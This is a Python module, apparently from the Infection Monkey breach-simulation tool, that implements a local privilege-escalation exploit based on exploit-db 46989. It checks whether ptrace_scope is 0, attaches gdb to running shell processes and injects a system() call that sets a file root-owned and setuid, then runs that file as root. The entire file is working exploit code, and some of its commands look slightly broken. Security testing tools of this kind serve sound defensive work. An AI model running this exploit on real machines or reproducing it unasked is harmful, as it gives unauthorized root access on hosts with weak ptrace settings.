"""
    Implementation is based on 'ptrace_scope' misconfiguration Local Privilege Escalation
    https://www.exploit-db.com/exploits/46989
    if  /proc/sys/kernel/yama/ptrace_scope = 0 and there is a process with uid as the user running as root
"""
import os
import time
import subprocess
from infection_monkey.pe import HostPrivExploiter
from logging import getLogger

LOG = getLogger(__name__)

__author__ = "D3fa1t"

pidOfShells = "pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'"
setSUID = "echo 'call system(\"echo | sudo -S chown root %(file)s >/dev/null 2>&1 && echo | sudo -S chmod +s root %(file)s >/dev/null 2>&1 \")' "
ptrace_scope = "cat /proc/sys/kernel/yama/ptrace_scope"
GDB = "gdb -q -n -p %(pid)s"


def shell(cmd):
    """
    :param cmd: Runs the cmd on a shell
    :return: returns the output
    """
    return os.popen(cmd).read()[:-1]

def check():
    """
    Checks if the machine is vulnerable
    Check the value of /proc/sys/kernel/yama/ptrace_scope, if it's zero then its vulnerable.
    :return: True if vulnerable
    """

    if shell(ptrace_scope) == '0':
        return True

    return False

class ptraceScopeExploiter(HostPrivExploiter):
    def try_priv_esc(self, command):

        """
        :param command: The path of the monkey to run as root
        :return: True if the pe is successful
        """
        if not check():
            print("The machine is not vulnerable!")
            return False

        pidList = shell(pidOfShells).split('\n')
        gdbCmd = setSUID % {'file': command}
        for pid in pidList:
            print("Trying to inject %s"% pid)
            print(setSUID)
            gdb = GDB % {'pid': pid}
            shell(gdbCmd + " | " + gdb )

            time.sleep(1)
            if os.stat(command).st_uid == 0:
                LOG.info("Successfully injected into the process!")
                monkey_process = subprocess.Popen(command, shell=True,
                                                  stdin=None, stdout=None, stderr=None,
                                                  close_fds=True, creationflags=0)

                print("Executed monkey process as root with (PID=%d) with command line: %s",
                         monkey_process.pid, command)

                return True
            else:
                print("%s couldn't be injected "% pid)

        return False



